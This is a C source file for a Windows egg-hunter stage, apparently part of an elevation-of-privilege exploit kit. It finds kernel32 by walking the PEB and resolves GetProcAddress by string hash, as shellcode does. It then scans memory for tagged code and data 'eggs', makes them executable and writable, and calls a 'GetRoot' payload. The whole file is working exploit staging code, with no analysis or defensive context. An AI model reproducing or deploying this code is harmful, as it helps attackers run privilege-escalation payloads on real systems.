#include "egghunt.h"
#include "EopUtilsType.h"
#include "..\EoP.h"

#define FAST_POINTER_FINDER

#pragma section("eggeop", read, execute)
#pragma code_seg("eggeop")

#ifndef NDEBUG
#pragma optimize( "", off )
#else
#pragma optimize( "", on )
#endif

void EggHunting( void )
{
	DWORD dwOldProtect;
	APIFUNCS apis;
	char strVirtualProtect[15] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t','\0'};
	char strVirtualQuery[13]   = { 'V','i','r','t','u','a','l','Q','u','e','r','y','\0'};
	char strIsBadReadPtr[13]   = { 'I','s','B','a','d','R','e','a','d','P','t','r','\0'};

	HMODULE hKernel32 = (HMODULE)EggGetKernel32Handle();
	if ((HANDLE)hKernel32 == INVALID_HANDLE_VALUE) return;

	apis.GetProcAddress = NULL;
	if (EggGetProcAddr(&apis.GetProcAddress) == FALSE) return;

	apis.VirtualProtect = (VIRTUALPROTECT)apis.GetProcAddress(hKernel32, strVirtualProtect);
	apis.VirtualQuery   = (VIRTUALQUERY)  apis.GetProcAddress(hKernel32, strVirtualQuery);
	apis.IsBadReadPtr   = (ISBADREADPTR)  apis.GetProcAddress(hKernel32, strIsBadReadPtr);

#if defined _M_IX86
	LPBYTE lpCodeTagged = (LPBYTE) EggScanTag(&apis, '68xT'); //  this is the x86 code tag
#elif defined _M_AMD64
	LPBYTE lpCodeTagged = (LPBYTE) EggScanTag(&apis, '46xT'); //  this is the x64 code tag
#endif

	ENVIRONMENT* lpDataTagged = (ENVIRONMENT*)EggScanTag(&apis, DATA_TAG, (ULONG_PTR)lpCodeTagged);
	if (lpCodeTagged && lpDataTagged)
	{
		lpDataTagged->lpCodeEgg = lpCodeTagged;
		GETROOT fpGetRoot = (GETROOT)(lpDataTagged->dwEntryPointEva + (ULONG_PTR)lpCodeTagged);
		lpDataTagged->lpString = (STRING_TABLE *)((DWORD_PTR)lpDataTagged->lpString+(DWORD_PTR)lpDataTagged);
		lpDataTagged->lpWinapiTable =
			(WINAPI_TABLE *)((DWORD_PTR)lpDataTagged->lpWinapiTable + (DWORD_PTR)lpDataTagged);
		DWORD_PTR lowAddr = min((DWORD_PTR)lpCodeTagged, (DWORD_PTR)fpGetRoot);

		if (apis.VirtualProtect((LPVOID)lowAddr, lpDataTagged->dwCodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
		{
			fpGetRoot(lpDataTagged);
		}
	}
}

BOOL EggIsUnreadablePage( __in APIFUNCS *lpApi, __in void *ptr )
{ 
	MEMORY_BASIC_INFORMATION mbi;
	size_t dw = lpApi->VirtualQuery(ptr, &mbi, sizeof(mbi));
	if (dw == 0) return TRUE;
	if (TEST_FLAG(mbi.Protect, PAGE_GUARD)) return TRUE;
	if (TEST_FLAG(mbi.Protect, PAGE_NOACCESS)) return TRUE;

	BOOL ok = ( TEST_FLAG(mbi.Protect, PAGE_READONLY) || 
		TEST_FLAG(mbi.Protect, PAGE_READWRITE)||
		TEST_FLAG(mbi.Protect, PAGE_WRITECOPY) ||
		TEST_FLAG(mbi.Protect, PAGE_EXECUTE_READ) ||
		TEST_FLAG(mbi.Protect, PAGE_EXECUTE_READWRITE) ||
		TEST_FLAG(mbi.Protect, PAGE_EXECUTE_WRITECOPY));
	return !ok;
}

LPVOID EggScanTag( __in APIFUNCS *lpApi, __in DWORD dwTag, __in ULONG_PTR p /*= 0x1000 */ )
{
	for (; p; p = (p | 0xfff) + 1)
	{
		// check page protection
		if (EggIsUnreadablePage( lpApi, (LPVOID)p)) {
			++p;
			continue;
		}
VERIFY_ADDRESS:
		if ((ULONG_PTR)p + 8 > ((ULONG_PTR)p | 0xfff) + 1) continue; 
		if (lpApi->IsBadReadPtr((LPVOID)p, 8)) continue;
		if ((*(DWORD*)(p) == dwTag) && (*(DWORD*)(p + 4) == dwTag))
			return (LPVOID)p;
		else {
			p++;
			goto VERIFY_ADDRESS;
		}
	}
	return (LPVOID)NULL;
}

DWORD GetStringHash( __in LPVOID lpBuffer, __in BOOL bUnicode, __in UINT uLen )
{
	DWORD dwHash = 0;
	LPSTR strBuffer = (LPSTR) lpBuffer;

	while (uLen--)
	{
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += (DWORD)*strBuffer++;

		if (bUnicode)
			strBuffer++;			
	}
	return dwHash;
}

HANDLE EggGetKernel32Handle()
{
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#ifdef _WIN64
	PPEB lpPeb = (PPEB) __readgsqword(0x60);
#else
	PPEB lpPeb = (PPEB) __readfsdword(0x30);
#endif

	PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;

#if !defined FAST_POINTER_FINDER
	WCHAR strKernel32[] = { '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };
	// SIZEOOFARRAY(strKernel32) == 14
#endif // FAST_POINTER_FINDER

	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length > 14)
		{
#ifdef FAST_POINTER_FINDER
			USHORT index = pModEntry->FullDllName.Length / sizeof(pModEntry->FullDllName.Buffer[0]) - 13;
			DWORD  dwHash = GetStringHash(&pModEntry->FullDllName.Buffer[index], TRUE, 13);

			if ( dwHash == 0x8fecdbff ||  // lower
				dwHash == 0x6e2bcfd7 )
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
#else
			BOOL bMatch = TRUE;
			for ( USHORT i = 0; i < _countof(strKernel32) -1; ++i)
			{
				USHORT index= pModEntry->FullDllName.Length / sizeof(pModEntry->FullDllName.Buffer[0]) - 13 + i;
				if (pModEntry->FullDllName.Buffer[index] != strKernel32[i])
				{
					bMatch = FALSE;
					break;
				}
			}

			if (bMatch)
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
#endif // FAST_POINTER_FINDER	
		}
		pListEntry = pListEntry->Flink;
	}

	return hKernel32;
}

BOOL EggGetProcAddr( __out GETPROCADDRESS *fpGetProcAddress )
{
	HANDLE hKernel32 = EggGetKernel32Handle();
	if (hKernel32 == INVALID_HANDLE_VALUE)
		return FALSE;

	LPBYTE lpBaseAddr = (LPBYTE) hKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER) lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs  = (PIMAGE_NT_HEADERS) (lpBaseAddr + lpDosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) (lpBaseAddr +  pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfFunctions);
	LPWORD pOrdArray   = (LPWORD)  (lpBaseAddr + pExportDir->AddressOfNameOrdinals);

	*fpGetProcAddress = NULL;

#if !defined FAST_POINTER_FINDER
	CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };
#endif // FAST_POINTER_FINDER

	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);

#ifdef FAST_POINTER_FINDER
		if (GetStringHash(pFuncName, FALSE, 14) == 0x7c0dfcaa) 
		{
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
			return TRUE;
		}
#else
		BOOL bMatch = TRUE;

		for ( USHORT j = 0; j < _countof(strGetProcAddress) -1; ++j)
		{
			if (pFuncName[j] != strGetProcAddress[j])
			{
				bMatch = FALSE;
				break;
			}
		}

		if (bMatch)
		{
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
			return TRUE;
		}

#endif // FAST_POINTER_FINDER
	}

	return FALSE;
}
